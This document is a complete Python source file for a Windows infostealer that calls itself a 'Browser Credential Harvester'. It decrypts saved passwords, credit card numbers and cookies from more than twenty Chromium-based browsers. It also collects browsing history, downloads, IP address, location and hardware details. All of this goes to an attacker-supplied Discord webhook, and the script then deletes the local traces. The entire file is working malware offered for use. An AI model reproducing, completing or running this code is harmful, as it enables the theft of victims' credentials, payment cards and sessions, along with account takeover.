import base64
import json
import os
import shutil
import sqlite3
import platform
import socket
import requests
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import getpass
import wmi
import zipfile

appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

# Replace this with your actual Discord webhook URL
DISCORD_WEBHOOK_URL = "Same here replace me"

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Expires On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}

def get_system_info():
    system_info = f"===== System Information =====\n"
    system_info += f"Timestamp: {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n"
    system_info += f"Device Name: {socket.gethostname()}\n"
    system_info += f"Username: {getpass.getuser()}\n"
    system_info += f"OS: {platform.system()} {platform.release()} ({platform.version()})\n"
    system_info += f"Architecture: {platform.machine()}\n"

    try:
        ip_response = requests.get('https://ipinfo.io/json', timeout=5)
        ip_data = ip_response.json()
        system_info += f"IP Address: {ip_data.get('ip', 'Unknown')}\n"
        system_info += f"ISP: {ip_data.get('org', 'Unknown')}\n"
        system_info += f"Location: {ip_data.get('city', 'Unknown')}, {ip_data.get('region', 'Unknown')}, {ip_data.get('country', 'Unknown')}\n"
    except Exception as e:
        system_info += f"IP/ISP Info: [Error: {str(e)}]\n"

    try:
        c = wmi.WMI()
        system_info += f"Processor: {c.Win32_Processor()[0].Name}\n"
        system_info += f"RAM: {round(int(c.Win32_ComputerSystem()[0].TotalPhysicalMemory) / (1024**3), 2)} GB\n"
        system_info += f"Motherboard: {c.Win32_BaseBoard()[0].Manufacturer} {c.Win32_BaseBoard()[0].Product}\n"
    except Exception as e:
        system_info += f"Hardware Info: [Error: {str(e)}]\n"
    
    return system_info

def create_zip(folder_names, zip_name):
    with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for folder in folder_names:
            if os.path.exists(folder):
                for root, _, files in os.walk(folder):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, start=os.path.dirname(folder))
                        zipf.write(file_path, os.path.join(folder, arcname))
    print(f"[+] Created zip file: {zip_name}")

def cleanup_folders_and_files(folder_names, zip_name=None):
    for folder in folder_names:
        if os.path.exists(folder):
            shutil.rmtree(folder, ignore_errors=True)
            print(f"[+] Deleted folder and contents: {folder}")
    if zip_name and os.path.exists(zip_name):
        os.remove(zip_name)
        print(f"[+] Deleted zip file: {zip_name}")

def send_to_discord_webhook(name, data_type_name, content):
    if content and content.strip():
        if len(content) < 2000:
            payload = {
                "content": f"{name} - {data_type_name.replace('_', ' ').capitalize()}\n{content[:1900]}"
            }
            response = requests.post(DISCORD_WEBHOOK_URL, json=payload)
            if response.status_code == 204 or response.status_code == 200:
                print(f"\t [+] Sent {data_type_name} for {name} to Discord webhook as raw message")
            else:
                print(f"\t [-] Failed to send {data_type_name} for {name} to Discord webhook: {response.status_code}")
        else:
            file_path = f'{name}/{data_type_name}.txt'
            if not os.path.exists(file_path):
                save_results(name, data_type_name, content)
            with open(file_path, 'r', encoding='utf-8') as f:
                files = {
                    'file': (f'{name}_{data_type_name}.txt', f, 'text/plain')
                }
                payload = {
                    "content": f"{name} - {data_type_name.replace('_', ' ').capitalize()} (Raw Text Data)"
                }
                response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
                if response.status_code == 204 or response.status_code == 200:
                    print(f"\t [+] Sent {data_type_name} for {name} to Discord webhook as raw text file")
                else:
                    print(f"\t [-] Failed to send {data_type_name} for {name} to Discord webhook: {response.status_code}")
    else:
        print(f"\t [-] No data to send for {data_type_name} in {name}")

def send_zip_to_discord(zip_name):
    if os.path.exists(zip_name):
        with open(zip_name, 'rb') as f:
            files = {
                'file': (zip_name, f, 'application/zip')
            }
            payload = {
                "content": "Collected Data Zip File"
            }
            response = requests.post(DISCORD_WEBHOOK_URL, data=payload, files=files)
            if response.status_code == 204 or response.status_code == 200:
                print(f"[+] Sent zip file {zip_name} to Discord webhook")
            else:
                print(f"[-] Failed to send zip file {zip_name} to Discord webhook: {response.status_code}")
    else:
        print(f"[-] Zip file {zip_name} does not exist for sending")

def get_master_key(path: str):
    if not os.path.exists(path):
        return None
    local_state_path = path + "\\Local State"
    if not os.path.exists(local_state_path):
        return None
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            c = f.read()
        local_state = json.loads(c)
        if 'os_crypt' not in local_state:
            return None
        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        key = key[5:]
        key = CryptUnprotectData(key, None, None, None, 0)[1]
        return key
    except Exception as e:
        print(f"\t [-] Error getting master key: {str(e)}")
        return None

def decrypt_password(buff: bytes, key: bytes) -> str:
    if len(buff) < 15:
        return f"[Error: Invalid encrypted data format, length too short ({len(buff)} bytes)]"
    header = buff[:3].hex()
    if buff[:3] not in [b'v10', b'v11']:
        return f"[Error: Unrecognized header ({header}), first 5 bytes: {buff[:5].hex()}]"
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16]  # Remove authentication tag
        try:
            return decrypted_pass.decode('utf-8')
        except UnicodeDecodeError:
            return f"[Non-UTF-8 Data: {decrypted_pass.hex()}]"
    except Exception as e:
        return f"[Error: Decryption failed, {str(e)}]"

def save_results(folder_name, type_of_data, content):
    if not os.path.exists(folder_name):
        os.mkdir(folder_name)
    if content and content.strip():
        with open(f'{folder_name}/{type_of_data}.txt', 'w', encoding="utf-8") as f:
            f.write(content)
        print(f"\t [*] Saved in {folder_name}/{type_of_data}.txt")
    else:
        print(f"\t [-] No Data Found!")

def get_data(path: str, profile: str, key, data_type_name, data_type):
    db_file = f'{path}\\{profile}{data_type["file"]}'
    if not os.path.exists(db_file):
        print(f"\t [-] Database file not found: {db_file}")
        return ""
    result = ""
    try:
        shutil.copy(db_file, 'temp_db')
    except Exception as e:
        print(f"\t [-] Can't access file {data_type['file']}: {str(e)}")
        return result
    conn = sqlite3.connect('temp_db')
    cursor = conn.cursor()
    try:
        cursor.execute(data_type['query'])
        for row in cursor.fetchall():
            row = list(row)
            if data_type['decrypt'] and key:
                for i in range(len(row)):
                    if isinstance(row[i], bytes) and row[i]:
                        decrypted_value = decrypt_password(row[i], key)
                        if decrypted_value.startswith("[Error") or decrypted_value.startswith("[Non-UTF-8"):
                            print(f"\t [Debug] Issue with field {data_type['columns'][i]} in {data_type_name} for browser path {path} (profile: {profile}) - Row data: {row[i][:10].hex()}...: {decrypted_value}")
                        row[i] = decrypted_value
            if data_type_name == 'history':
                if row[2] != 0:
                    row[2] = convert_chrome_time(row[2])
                else:
                    row[2] = "0"
            result += "\n".join([f"{col}: {val}" for col, val in zip(data_type['columns'], row)]) + "\n\n"
    except Exception as e:
        print(f"\t [-] Error querying database for {data_type_name}: {str(e)}")
    finally:
        conn.close()
        if os.path.exists('temp_db'):
            os.remove('temp_db')
    return result

def convert_chrome_time(chrome_time):
    return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')

def installed_browsers():
    available = []
    for x in browsers.keys():
        if os.path.exists(browsers[x] + "\\Local State"):
            available.append(x)
    return available

if __name__ == '__main__':
    print("Starting Browser Credential Harvester and System Info Logger")
    
    system_info = get_system_info()
    print("[+] System Information Collected")
    save_results("SystemInfo", "system_info", system_info)
    send_to_discord_webhook("SystemInfo", "system_info", system_info)
    print("------\n")

    available_browsers = installed_browsers()
    if not available_browsers:
        print("[-] No supported browsers found on this system.")
    else:
        print(f"[+] Found browsers: {', '.join(available_browsers)}")

    folder_names = ["SystemInfo"] + available_browsers

    for browser in available_browsers:
        browser_path = browsers[browser]
        master_key = get_master_key(browser_path)
        if not master_key:
            print(f"[-] Failed to retrieve master key for {browser}")
            continue
        print(f"[+] Getting Stored Details from {browser}")

        for data_type_name, data_type in data_queries.items():
            print(f"\t [!] Getting {data_type_name.replace('_', ' ').capitalize()}")
            notdefault = ['opera-gx']
            profile = "Default"
            if browser in notdefault:
                profile = ""
            data = get_data(browser_path, profile, master_key, data_type_name, data_type)
            save_results(browser, data_type_name, data)
            send_to_discord_webhook(browser, data_type_name, data)
            print("\t------\n")

    # Create zip of all collected data
    zip_name = f"Collected_Data_{datetime.now().strftime('%Y%m%d_%H%M%S')}.zip"
    create_zip(folder_names, zip_name)
    
    # Send zip file to Discord webhook
    send_zip_to_discord(zip_name)
    
    # Clean up folders and zip file after sending
    cleanup_folders_and_files(folder_names, zip_name)
    print("[+] Cleanup complete. All local data deleted.")
